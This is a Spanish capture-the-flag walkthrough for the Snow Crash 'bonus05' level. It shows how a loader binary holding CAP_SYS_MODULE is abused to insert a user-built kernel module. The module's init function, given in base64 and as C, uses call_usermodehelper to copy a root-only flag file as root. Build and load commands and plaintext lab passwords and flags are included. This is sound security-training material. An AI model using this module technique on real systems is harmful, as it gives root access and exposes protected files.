# Bonus05 - Snow Crash

## Tipo de ejercicio

Carga de un **módulo de kernel** controlado por el atacante mediante un helper
con la capability **`CAP_SYS_MODULE`**, y obtención de la flag desde espacio de
kernel (lectura privilegiada del fichero de `flagbonus05`).

## Objetivo

Obtener la credencial asociada a `flagbonus05` (último nivel bonus de esta OVA).

El binario `/opt/snowcrash/bonus05/rife` no es legible, pero es ejecutable y
tiene `cap_sys_module=ep`. Carga en el kernel el fichero `.ko` que se le pase
como argumento (`finit_module`). La plantilla del home describe un módulo que
expone datos en `/proc/rife`; en la práctica, la forma fiable de leer el
`.flag` en este entorno es un módulo que, al inicializarse, ejecuta un comando
como root con `call_usermodehelper`.

La pista del home de `bonus05` es:

```text
Rife owned the wire. All of it.
```

---

## 1. Acceso al nivel

Desde el equipo anfitrión (puerto reenviado `2424` en esta configuración; el
subject oficial usa `4242`):

```bash
ssh bonus05@localhost -p 2424
```

La contraseña de `bonus05` es la flag de `bonus04`:

```text
oo0eoaiia5ei8oo9xasah2ihu
```

Comprobar identidad y entorno:

```bash
whoami
id
pwd
ls -la
cat README
```

Resultado esperado:

```text
bonus05
uid=3005(bonus05) gid=3005(bonus05) groups=3005(bonus05),1001(levelgroup)
/home/bonus05
```

```text
Rife owned the wire. All of it.
```

En el home aparece también la plantilla del módulo:

```text
-rw-r--r--  1 bonus05 bonus05 4500 ... rife_template.c
```

---

## 2. Localizar el componente del nivel

```bash
ls -laR /opt/snowcrash/bonus05
```

Resultado:

```text
/opt/snowcrash/bonus05:
-rwxr-xr-x  1 root root   263 ... load_rife.sh
-rwx--x--x  1 root root 16376 ... rife
-rw-r--r--  1 root root  2132 ... rife_loader.c
```

| Fichero | Rol |
|---------|-----|
| `rife` | Binario compilado que ejecuta la syscall `finit_module` para cargar en el kernel el `.ko` que se le pase como argumento. Se llama **"loader privilegiado"** porque, gracias a su capability `cap_sys_module` (ver abajo), puede cargar módulos de kernel aunque quien lo ejecute no sea `root`. |
| `load_rife.sh` | Script que solo reenvía el argumento recibido al binario `rife`: `exec /opt/snowcrash/bonus05/rife "$1"`. Se le llama **"wrapper"** porque no hace nada por sí mismo, solo envuelve la llamada a `rife`. |
| `rife_loader.c` | Código fuente de `rife`, legible aunque el binario compilado no lo sea; sirve para entender qué hace el loader sin poder leer el ejecutable directamente. |
| `~/rife_template.c` | Archivo de partida (en el `home` de `bonus05`, no en `/opt/snowcrash/bonus05`) para escribir **tu propio módulo de kernel**. Se le llama **"esqueleto"** porque ya trae la estructura del módulo (registro en `/proc`, `init`/`exit`) pero dos funciones están sin terminar, marcadas como `TODO A` y `TODO B` (detalladas en la sección 3); hay que completarlas para que el módulo haga lo necesario. |

Capabilities del loader:

```bash
getcap /opt/snowcrash/bonus05/rife
```

```text
/opt/snowcrash/bonus05/rife cap_sys_module=ep
```

`CAP_SYS_MODULE` permite insertar (y, en general, gestionar) módulos de kernel
sin ser root. El modo del binario es `711` (`-rwx--x--x`): se puede ejecutar,
pero no leer (por eso existe `rife_loader.c` como documentación).

Uso:

```bash
/opt/snowcrash/bonus05/rife
# usage: /opt/snowcrash/bonus05/rife <module.ko>
```

No hay servicio `systemd` propio de bonus05: el vector es el loader + un
`.ko` compilado por el usuario.

---

## 3. Documentación del loader (`rife_loader.c`)

```bash
cat /opt/snowcrash/bonus05/rife_loader.c
```

Tras ejecutar esto, vemos los fragmentos relevantes:

```c
/* finit_module(fd, param_values, flags) */
static int finit_module(int fd, const char *params, int flags)
{
    return (int)syscall(SYS_finit_module, fd, params, flags);
}

/* ... */
int fd = open(path, O_RDONLY | O_CLOEXEC);
...
if (finit_module(fd, "", 0) < 0) {
    fprintf(stderr, "rife: finit_module: %s\n", strerror(errno));
    ...
}
printf("rife: module loaded — cat /proc/rife\n");
```

Comentarios del propio fuente:

- Tras cargar el módulo, se espera poder leer la flag en **`/proc/rife`**.
- La capability se asigna con `setcap cap_sys_module+ep` sobre este binario.

Para ver el contenido de la plantilla del módulo (en el `home` de `bonus05`,
no en `/opt/snowcrash/bonus05`):

```bash
cat ~/rife_template.c
```

Al leerla, se observa que pide implementar:

- **TODO A:** callback `rife_proc_show` (escribir datos en el `seq_file`).
- **TODO B:** eliminar `/proc/rife` en el `exit` del módulo (`proc_remove`).

También registra `/proc/rife` en el `init` mediante `proc_create_single`.
Cuando se ejecuta `cat /proc/rife`, el kernel llama a `rife_proc_show`, que
debe escribir la respuesta usando `seq_puts` o `seq_printf`. Sin embargo,
`rife_data[]` está **vacío**: mostrarlo no revela la flag. Primero hay que
obtener el contenido de `/home/flagbonus05/.flag` mediante una operación con
privilegios de root/kernel y, después, escribir ese contenido en `/proc/rife`.
La solución desarrollada en la sección 5 toma otra ruta: no completa estos
TODO ni usa `/proc/rife`, sino que carga un módulo auxiliar que crea
`/tmp/rife_flag`.

---

## 4. Intentos que fallan (y por qué)

### 4.1. `filp_open` del `.flag` en el callback de `/proc`

Al hacer `cat /proc/rife`, el callback del módulo se ejecuta con las
**credenciales del proceso lector** (`bonus05`). Entonces:

```c
f = filp_open("/home/flagbonus05/.flag", O_RDONLY, 0);
/* PTR_ERR(f) == -13  →  EACCES */
```

`bonus05` no puede abrir ese fichero; el kernel aplica DAC con esas
credenciales.

### 4.2. `prepare_kernel_cred(NULL)` + `override_creds`

En muchos sistemas se usa para actuar temporalmente como credenciales de
kernel/root. En **esta** OVA, `prepare_kernel_cred(NULL)` devuelve **`NULL`**
(política / restricciones del kernel), y el módulo solo puede informar
`prepare_kernel_cred failed`.

### 4.3. Módulos ya cargados y sin `rmmod`

Una vez cargado un módulo defectuoso (`rife`, `rife2`, …), sin
`CAP_SYS_MODULE` en la shell el usuario **no** puede hacer `rmmod`. Un nuevo
`.ko` con el **mismo nombre de módulo** falla con:

```text
rife: finit_module: File exists
```

Solución: compilar módulos con **nombres distintos** (`rife3`, `rife4`, …) y,
si se usa `/proc`, entradas distintas (`/proc/rife2`, `/proc/rife3`, …).

### 4.4. Heredocs rotos al pegar

Pegar bloques grandes con comillas anidadas en la sesión SSH corrompe a
menudo el fichero `.c` o el `Makefile` (`obj-m := rife4.o\n` literal). Para
este nivel es más seguro generar el fuente con **`base64 -d`** o un script
mínimo y verificar con `head` / `wc -l` antes de `make`.

---

## 5. Solución: ejecutar un comando como root con `call_usermodehelper`

`call_usermodehelper` es una función del kernel que permite lanzar un programa
normal de Linux desde un módulo. El proceso se ejecuta con las credenciales del
helper del kernel, normalmente con privilegios de root. Por eso, desde
`module_init` se puede copiar el `.flag` a un path legible por `bonus05`:

```text
cp /home/flagbonus05/.flag /tmp/rife_flag && chmod 644 /tmp/rife_flag
```

La función no lee la flag directamente. En su lugar, pide al kernel que
ejecute un comando normal (`/bin/sh`). El comando copia el archivo protegido a
`/tmp/rife_flag` y cambia sus permisos para que `bonus05` pueda leerlo.
En esta solución se lee directamente esa copia; no se utiliza `/proc/rife`.

### 5.1. Crear el directorio de trabajo

```bash
mkdir -p ~/rife_build
cd ~/rife_build
```

### 5.2. Makefile

```bash
printf 'obj-m := rife4.o\n' > Makefile
cat Makefile
```

Salida esperada:

```text
bonus05@snowcrash:~/rife_build$ cat Makefile
obj-m := rife4.o
```

### 5.3. Fuente del módulo (vía base64, sin heredoc frágil)

El bloque largo que empieza por `I2luY...` es el código C de un módulo nuevo,
codificado en Base64. Al decodificarlo se crea `rife4.c`; no se está
reconstruyendo todo `rife_template.c`. La plantilla original contiene la
lógica de `/proc/rife` y sus TODO, mientras que este módulo solo incluye lo
mínimo necesario para ejecutar `call_usermodehelper` y copiar la flag a
`/tmp/rife_flag`. Por eso su contenido es más corto y no contiene el callback
`rife_proc_show`.

`base64 -d` convierte ese texto en el código fuente de `rife4.c`. Se usa Base64
para evitar que las comillas, los saltos de línea o caracteres especiales se
rompan al pegar el código por SSH. `'B64'` es solo la marca que indica dónde
termina el texto que debe decodificarse.

```bash
base64 -d > rife4.c << 'B64'
I2luY2x1ZGUgPGxpbnV4L21vZHVsZS5oPgojaW5jbHVkZSA8bGludXgva2VybmVsLmg+CiNp
bmNsdWRlIDxsaW51eC9pbml0Lmg+CiNpbmNsdWRlIDxsaW51eC9rbW9kLmg+CgpNT0RVTEVf
TElDRU5TRSgiR1BMIik7Ck1PRFVMRV9BVVRIT1IoImJvbnVzMDUiKTsKTU9EVUxFX0RFU0NS
SVBUSU9OKCJSaWZlIHVtaCBoZWxwZXIiKTsKCnN0YXRpYyBpbnQgX19pbml0IHJpZmVfaW5p
dCh2b2lkKQp7CgljaGFyICphcmd2W10gPSB7CgkJIi9iaW4vc2giLAoJCSItYyIsCgkJImNw
IC9ob21lL2ZsYWdib251czA1Ly5mbGFnIC90bXAvcmlmZV9mbGFnICYmIGNobW9kIDY0NCAv
dG1wL3JpZmVfZmxhZyIsCgkJTlVMTAoJfTsKCWNoYXIgKmVudnBbXSA9IHsKCQkiSE9NRT0v
IiwKCQkiUEFUSD0vc2JpbjovYmluOi91c3Ivc2JpbjovdXNyL2JpbiIsCgkJTlVMTAoJfTsK
CWludCByZXQgPSBjYWxsX3VzZXJtb2RlaGVscGVyKGFyZ3ZbMF0sIGFyZ3YsIGVudnAsIFVN
SF9XQUlUX1BST0MpOwoJcHJfaW5mbygicmlmZTQ6IHVtaCByZXQ9JWRcbiIsIHJldCk7Cgly
ZXR1cm4gMDsKfQoKc3RhdGljIHZvaWQgX19leGl0IHJpZmVfZXhpdCh2b2lkKQp7Cglwcl9p
bmZvKCJyaWZlNDogdW5sb2FkZWRcbiIpOwp9Cgptb2R1bGVfaW5pdChyaWZlX2luaXQpOwpt
b2R1bGVfZXhpdChyaWZlX2V4aXQpOwo=
B64

wc -l rife4.c
head -25 rife4.c
```

Estos comandos sirven para verificar que el texto Base64 se ha convertido
correctamente antes de compilar:

- `wc -l rife4.c` cuenta las líneas del archivo y confirma que no está vacío ni
  se ha pegado de forma incompleta.
- `head -25 rife4.c` muestra las primeras 25 líneas para comprobar que el
  resultado empieza como código C válido, con sus `#include` y la función de
  inicialización.

No ejecutan el módulo ni leen la flag; solo inspeccionan el archivo fuente
recién creado.

Equivalente en C legible:

```c
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/kmod.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("bonus05");
MODULE_DESCRIPTION("Rife umh helper");

static int __init rife_init(void)
{
	/* argv contiene el programa y sus argumentos.
	 * Aquí se ejecuta: /bin/sh -c "<comando>". */
	char *argv[] = {
		"/bin/sh",
		"-c",
		"cp /home/flagbonus05/.flag /tmp/rife_flag && chmod 644 /tmp/rife_flag",
		NULL
	};
	/* Variables de entorno mínimas que usará el proceso ejecutado. */
	char *envp[] = {
		"HOME=/",
		"PATH=/sbin:/bin:/usr/sbin:/usr/bin",
		NULL
	};
	/* UMH_WAIT_PROC hace que el módulo espere a que termine el comando.
	 * ret indica si la ejecución terminó correctamente o con error. */
	int ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
	pr_info("rife4: umh ret=%d\n", ret);
	return 0;
}

static void __exit rife_exit(void)
{
	pr_info("rife4: unloaded\n");
}

module_init(rife_init);
module_exit(rife_exit);
```

### 5.4. Compilar y cargar

```bash
make -C /lib/modules/$(uname -r)/build M=$(pwd) modules
ls -la rife4.ko
```

El primer comando compila el módulo:

- `make -C /lib/modules/$(uname -r)/build` usa el sistema de compilación del
  kernel que está ejecutándose; `uname -r` obtiene su versión.
- `M=$(pwd)` indica que el código del módulo y el `Makefile` están en el
  directorio actual (`~/rife_build`).
- `modules` pide compilar el módulo externo y generar `rife4.ko`.

El segundo comando (`ls -la rife4.ko`) muestra los permisos, propietario y
tamaño del archivo generado. Sirve para confirmar que la compilación creó el
módulo que después se carga con el programa `rife`.

El archivo `rife4.ko` es necesario porque el programa `rife` solo sabe cargar
módulos del kernel. Al cargarlo, se ejecuta automáticamente `rife_init`, que
llama a `call_usermodehelper` y crea `/tmp/rife_flag` copiando allí la flag.
Por tanto, el archivo temporal no existía antes de cargar el módulo: es el
resultado de ejecutar `rife4.ko`.

Por tanto, ejecutamos el siguiente comando para cargar `rife4.ko`. Al
cargarse, el módulo ejecuta `rife_init` y crea `/tmp/rife_flag`:

```bash
/opt/snowcrash/bonus05/rife $(pwd)/rife4.ko
```

### 5.5. Leer la flag

```bash
ls -la /tmp/rife_flag
cat /tmp/rife_flag
```

Salida obtenida:

```text
-rw-r--r-- 1 root root 26 ... /tmp/rife_flag
7oa2eihe3ohohzee5gob2aing
```

### Secuencia

1. Se compila un `.ko` controlado por `bonus05`.
2. El loader con `CAP_SYS_MODULE` inserta el módulo en el kernel.
3. En `module_init`, `call_usermodehelper` ejecuta un `cp` como root.
4. `/tmp/rife_flag` queda legible y contiene la credencial.

---

## 6. Credencial final

```text
7oa2eihe3ohohzee5gob2aing
```

Guardar en el repositorio:

```text
bonus05/flag
```

con una sola línea con esa cadena.

Con esto se cierra la parte **bonus** de la OVA (bonus01–bonus05).

---

## 7. Resumen de comandos válidos

```bash
ssh bonus05@localhost -p 2424
ls -la
cat README
cat ~/rife_template.c
cat /opt/snowcrash/bonus05/rife_loader.c
getcap /opt/snowcrash/bonus05/rife

mkdir -p ~/rife_build && cd ~/rife_build
printf 'obj-m := rife4.o\n' > Makefile
# escribir rife4.c (base64 o editor) con call_usermodehelper → cp del .flag
make -C /lib/modules/$(uname -r)/build M=$(pwd) modules
/opt/snowcrash/bonus05/rife $(pwd)/rife4.ko
cat /tmp/rife_flag
```

---

## 8. Conceptos importantes

- **`CAP_SYS_MODULE`**: capability que permite cargar módulos de kernel sin UID
  0 completo. Es un vector de escalada fuerte si el atacante puede suministrar
  el `.ko`.
- **`finit_module(2)`**: carga un módulo a partir de un descriptor de fichero
  abierto (el loader abre el `.ko` y llama al syscall).
- **Credenciales en callbacks de `/proc`**: el código del módulo que atiende
  una lectura de `/proc` suele ejecutarse en el contexto del proceso que lee;
  no hereda automáticamente privilegios de “root del módulo”.
- **`prepare_kernel_cred` / `override_creds`**: patrón habitual para elevar
  credenciales en kernel; puede estar limitado o devolver `NULL` según la
  configuración del sistema.
- **`call_usermodehelper`**: API del kernel para lanzar un binario en userland
  (típicamente como root). Útil cuando se puede ejecutar código en
  `module_init` y se necesita interactuar con el sistema de ficheros con
  privilegios altos.
- **Headers del kernel en la OVA**: `/lib/modules/$(uname -r)/build` debe
  apuntar a los headers instalados para poder compilar módulos fuera del árbol
  principal (`M=$(pwd)`).

---

## 9. Conclusión

No hace falta modificar la OVA ni el loader. La solución consiste en:

1. Entender que `rife` carga cualquier `.ko` válido gracias a `CAP_SYS_MODULE`.
2. Compilar un módulo propio que en el `init` copie
   `/home/flagbonus05/.flag` a `/tmp/rife_flag` mediante
   `call_usermodehelper`.
3. Cargar el módulo con `/opt/snowcrash/bonus05/rife` y leer el fichero de
   salida.

Credencial obtenida:

```text
7oa2eihe3ohohzee5gob2aing
```

---

## 10. Estructura recomendada en el repositorio

```text
bonus05/
├── flag                          # 7oa2eihe3ohohzee5gob2aing
└── resources/
    └── bonus05.md                # este documento
```

Opcional: guardar una copia de `rife4.c` / `Makefile` en `resources/` para
reproducir el build.

Según la convención del repo `42_snow-crash`, la guía detallada vive en
`bonus05/resources/bonus05.md` y el token en `bonus05/flag`.
```
